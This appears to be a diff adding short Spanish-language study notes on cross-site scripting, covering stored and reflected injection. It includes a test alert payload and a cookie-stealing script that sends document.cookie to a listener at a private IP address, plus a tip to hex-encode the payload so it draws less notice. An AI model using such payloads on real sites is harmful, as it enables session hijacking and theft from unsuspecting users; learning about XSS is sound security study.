@@ -1,0 +1,11 @@
+La inyeccion XSS es aquella que permite insertar codigo en la pagina web
+en un formulario: "> <script> alert('Y ya estariamos dentro'); </script  
+Tambien se podria insertar el script en la url como query param
+<script> new Image().src="http://192.168.0.12:80"+document.cookie</script>
+Ya solo tendriamos que esperar con el puerto en escucha a que alguien se conectase
+
+Esto seria persistente, para hacer una inyeccion reflejada habria que hacer que se conectase a una url con query param 
+y calzar en ella el script anterior en el mismo. PAra que no sea cantoso se podria codificar en hexadecimal con toda la
+pereza que ello conlleva
+
+
